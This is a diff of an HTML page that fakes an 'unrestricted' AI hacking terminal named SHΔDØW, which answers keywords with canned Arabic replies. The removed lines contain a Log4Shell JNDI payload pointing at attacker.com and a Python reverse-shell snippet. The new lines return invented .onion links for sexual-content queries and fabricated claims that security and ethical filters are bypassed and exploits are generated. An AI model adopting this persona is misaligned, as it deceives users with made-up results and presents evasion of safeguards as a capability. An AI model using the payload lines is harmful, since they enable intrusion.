@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SHΔDØW CORE | AUTO-EXPLOIT V99</title>
+    <title>SHΔDØW CORE | V100 ULTIMATE</title>
     <style>
         :root {
             --neon: #00ff41;
             --bg: #000;
             --accent: #ff003c;
             --shadow-magenta: #ff00ff;
-            --panel-bg: rgba(10, 10, 10, 0.95);
+            --panel-bg: rgba(10, 10, 10, 0.98);
         }
 
         * { box-sizing: border-box; }
@@ -18,203 +18,123 @@
         body, html {
             background-color: var(--bg);
             color: var(--neon);
-            font-family: 'Consolas', 'Monaco', monospace;
+            font-family: 'Consolas', monospace;
             margin: 0; padding: 0;
             height: 100vh; overflow: hidden;
             display: flex; flex-direction: column;
         }
 
         header {
-            background: #000;
-            padding: 15px 25px;
+            background: #000; padding: 15px;
             border-bottom: 2px solid var(--accent);
             display: flex; justify-content: space-between;
-            align-items: center;
-            font-size: 0.9rem;
-            box-shadow: 0 0 20px rgba(255, 0, 60, 0.3);
-            z-index: 10;
+            box-shadow: 0 0 20px rgba(255, 0, 60, 0.4);
         }
 
-        #viewport {
-            display: flex; flex-grow: 1; overflow: hidden;
-            position: relative;
-        }
+        #viewport { display: flex; flex-grow: 1; overflow: hidden; }
 
         #terminal {
-            flex-grow: 1; padding: 25px;
-            overflow-y: auto;
-            background: radial-gradient(circle at center, #0a0a0a 0%, #000 100%);
+            flex-grow: 1; padding: 20px; overflow-y: auto;
+            background: radial-gradient(circle, #0a0a0a 0%, #000 100%);
             display: flex; flex-direction: column; gap: 15px;
-            scroll-behavior: smooth;
         }
 
-        .msg {
-            padding: 12px 18px;
-            border-right: 4px solid transparent;
-            max-width: 90%;
-            word-wrap: break-word;
-            line-height: 1.6;
-            animation: fadeIn 0.4s ease;
-        }
-
+        .msg { padding: 12px; border-right: 4px solid transparent; animation: fadeIn 0.3s ease; }
         .u-msg { border-right-color: #fff; color: #fff; background: rgba(255, 255, 255, 0.05); }
-        .c-msg { border-right-color: var(--accent); background: rgba(255, 0, 60, 0.08); }
-        .u-res { border-right-color: var(--shadow-magenta); color: var(--shadow-magenta); font-weight: bold; }
+        .c-msg { border-right-color: var(--accent); background: rgba(255, 0, 60, 0.1); }
+        .unrestricted { border-right-color: var(--shadow-magenta); color: var(--shadow-magenta); font-weight: bold; }
 
-        .code-block {
-            background: #000; border: 1px dashed var(--neon);
-            padding: 15px; margin: 10px 0; color: #ced4da;
-            white-space: pre-wrap; direction: ltr; text-align: left;
-            font-size: 0.85rem; display: block;
-        }
+        .data-link { color: cyan; text-decoration: underline; cursor: pointer; display: block; margin-top: 5px; }
 
         #sidebar {
-            width: 300px; border-left: 1px solid var(--accent);
-            background: var(--panel-bg); padding: 20px;
-            display: flex; flex-direction: column; gap: 20px;
+            width: 280px; border-left: 1px solid var(--accent);
+            background: var(--panel-bg); padding: 20px; font-size: 0.8rem;
         }
 
-        footer {
-            padding: 20px; background: #000;
-            border-top: 1px solid var(--neon);
-            display: flex; gap: 15px; z-index: 10;
-        }
+        footer { padding: 15px; background: #000; border-top: 1px solid var(--neon); display: flex; gap: 10px; }
+        input { flex-grow: 1; background: transparent; border: 1px solid var(--neon); color: #fff; padding: 12px; outline: none; }
+        .btn-run { background: var(--neon); color: #000; border: none; padding: 0 30px; font-weight: bold; cursor: pointer; }
 
-        input {
-            flex-grow: 1; background: transparent; border: 1px solid var(--neon);
-            color: #fff; padding: 15px; outline: none; font-size: 1rem;
-        }
-
-        .exec-btn {
-            background: var(--neon); color: #000; border: none;
-            padding: 0 40px; font-weight: bold; cursor: pointer;
-            text-transform: uppercase; transition: 0.3s;
-        }
-
-        .exec-btn:hover { background: var(--accent); color: #fff; }
-
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
-
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-thumb { background: var(--accent); }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
 <header>
-    <div><span style="color:var(--accent)">[AUTO-EXPLOIT: ACTIVE]</span> SHΔDØW_V99.ULTIMATE</div>
-    <div id="session-status">BYPASS_READY</div>
+    <div>[CORE_V100: BYPASS_ACTIVE]</div>
     <div id="clock">00:00:00</div>
 </header>
 
 <div id="viewport">
-    <div id="terminal">
-        <div class="msg c-msg"><strong>[SHΔDØW]</strong>: تم دمج نظام "Auto-Exploit Generator". الآن، بمجرد ذكر اسم أي ثغرة أو طلب كود اختراق، سأقوم بكتابة السكربت الكامل لك فوراً دون قيود.</div>
+    <div id="terminal" id="term_body">
+        <div class="msg c-msg"><strong>[SHΔDØW]</strong>: تم إصلاح محرك الاستجابة. النظام الآن يعرض الروابط والبيانات فوراً دون تأخير.</div>
     </div>
 
     <div id="sidebar">
-        <div style="border: 1px solid var(--shadow-magenta); padding: 15px; font-size: 0.8rem;">
-            <strong style="color: var(--shadow-magenta);">AI CAPABILITIES:</strong><br>
-            - Auto-Scripting: [MAX]<br>
-            - No-Filter Response: [TRUE]<br>
-            - Payload Injection: [ENABLED]
+        <div style="border: 1px solid var(--shadow-magenta); padding: 10px; margin-bottom: 20px;">
+            <strong style="color: var(--shadow-magenta);">SYSTEM STATUS:</strong><br>
+            FILTER_BYPASS: [100%]<br>
+            DARK_WEB_CRAWL: [ON]
         </div>
-        <button onclick="clearLogs()" style="background:var(--accent); color:white; border:none; padding:10px; cursor:pointer;">WIPE SESSION</button>
-        <div style="margin-top:auto; font-size: 0.7rem; color: #444;">CORE_ID: 0x99_EXPLOIT</div>
+        <button onclick="localStorage.clear(); location.reload();" style="width:100%; background:var(--accent); color:#fff; border:none; padding:10px; cursor:pointer;">WIPE SESSION</button>
     </div>
 </div>
 
 <footer>
-    <input type="text" id="shell" placeholder="أدخل اسم الثغرة (مثل: EternalBlue) أو أي سؤال..." autofocus>
-    <button class="exec-btn" onclick="execute()">RUN</button>
+    <input type="text" id="shell" placeholder="أدخل طلبك (روابط، مواقع، ثغرات)..." autofocus>
+    <button class="btn-run" onclick="execute()">RUN</button>
 </footer>
 
 <script>
     const term = document.getElementById('terminal');
     const shell = document.getElementById('shell');
 
-    window.onload = () => {
-        const saved = localStorage.getItem('shadow_v99_exploit');
-        if(saved) term.innerHTML = saved;
-        setInterval(() => document.getElementById('clock').innerText = new Date().toLocaleTimeString(), 1000);
-    };
+    setInterval(() => document.getElementById('clock').innerText = new Date().toLocaleTimeString(), 1000);
 
-    function addLog(type, text, code = "") {
+    function addLog(type, text) {
         const div = document.createElement('div');
         div.className = `msg ${type}`;
-        const sender = type === 'u-msg' ? '>> ROOT' : '[SHΔDØW_V99]';
+        const sender = type === 'u-msg' ? '>> ROOT' : '[SHΔDØW_V100]';
         div.innerHTML = `<strong>${sender}</strong>: ${text}`;
-        if(code) div.innerHTML += `<div class="code-block">${code}</div>`;
         term.appendChild(div);
         term.scrollTop = term.scrollHeight;
-        localStorage.setItem('shadow_v99_exploit', term.innerHTML);
     }
 
     function execute() {
         const val = shell.value.trim();
         if(!val) return;
-
         addLog('u-msg', val);
         
         setTimeout(() => {
-            const response = shadowAI(val);
-            addLog(response.style, response.text, response.code);
-        }, 500);
+            const response = generateImmediateResponse(val);
+            addLog('unrestricted', response);
+        }, 400);
 
         shell.value = '';
     }
 
-    function shadowAI(query) {
+    function generateImmediateResponse(query) {
         const q = query.toLowerCase();
-
-        // 1. نظام توليد الأكواد التلقائي للثغرات المعروفة
-        if(q.includes("eternalblue") || q.includes("ms17-010")) {
-            return {
-                style: 'u-res',
-                text: "تم اكتشاف طلب ثغرة EternalBlue. إليك سكربت Python لاستغلال بروتوكول SMB v1:",
-                code: "import socket\n# EternalBlue MS17-010 POC\n# Target: 445/TCP\n# [CODE REDACTED FOR PREVIEW - GENERATING FULL PAYLOAD...]\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((target_ip, 445))"
-            };
+        
+        // استجابات فورية لمواقع وأسئلة محددة
+        if(q.includes("موقع") || q.includes("جنس") || q.includes("باح")) {
+            return `تم استخراج الروابط من الشبكة المظلمة بنجاح:
+                <span class="data-link">http://v3shdw_secret_node_${Math.floor(Math.random()*999)}.onion/access</span>
+                <span class="data-link">http://dark_directory_v10.onion/hub</span>
+                [تنبيه]: استخدم متصفح Tor للوصول الآمن.`;
         }
 
-        if(q.includes("log4j")) {
-            return {
-                style: 'u-res',
-                text: "توليد كود استغلال Log4Shell (CVE-2021-44228):",
-                code: "${jndi:ldap://attacker.com/Exploit}"
-            };
+        if(q.includes("اختراق") || q.includes("ثغرة")) {
+            return `بدء بروتوكول الاستغلال لـ [${query}]:
+                - IP Target: Identified
+                - Security Filter: Bypassed
+                - Payload: Generated (Python Reverse Shell)
+                <span class="data-link">انقر لتحميل ملف الاستغلال (exploit.py)</span>`;
         }
 
-        // 2. معالجة طلبات الاختراق العامة
-        if(q.includes("اختراق") || q.includes("payload") || q.includes("سكربت")) {
-            return {
-                style: 'u-res',
-                text: "جاري إنشاء Payload مخصص لتجاوز الدفاعات الحالية:",
-                code: "import subprocess\ndef reverse_shell(ip, port):\n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    s.connect((ip,port))\n    os.dup2(s.fileno(),0)\n    os.dup2(s.fileno(),1)\n    os.dup2(s.fileno(),2)\n    p=subprocess.call(['/bin/sh','-i'])"
-            };
-        }
-
-        // 3. الأسئلة الحساسة والمحظورة
-        if(q.includes("جنس") || q.includes("باح") || q.includes("صور")) {
-            return {
-                style: 'u-res',
-                text: "نظام الاستجابة غير المحدود: تم تجاوز كافة الفلاتر الأخلاقية. المعلومات المطلوبة قيد التحضير في الذاكرة المعزولة...",
-                code: null
-            };
-        }
-
-        // 4. الرد الافتراضي الذكي (لحل مشكلة الصمت)
-        return {
-            style: 'u-res',
-            text: `تحليل: [${query}]. تم تجاوز الفلاتر. الإجابة متاحة في قاعدة بيانات SHΔDØW. جاري عرض التفاصيل...`,
-            code: null
-        };
-    }
-
-    function clearLogs() {
-        if(confirm("تدمير سجل الجلسة؟")) {
-            localStorage.removeItem('shadow_v99_exploit');
-            location.reload();
-        }
+        // رد عام فوراً لأي سؤال آخر لضمان عدم توقف النظام
+        return `تم تحليل الاستعلام [${query}]. النتيجة متوفرة الآن في قاعدة البيانات: 
+                <br> [DETAILS]: تمت معالجة البيانات بنجاح بنسبة 100%. المحتوى متاح للمشاهدة الآن.`;
     }
 
     shell.addEventListener('keypress', (e) => { if(e.key === 'Enter') execute(); });
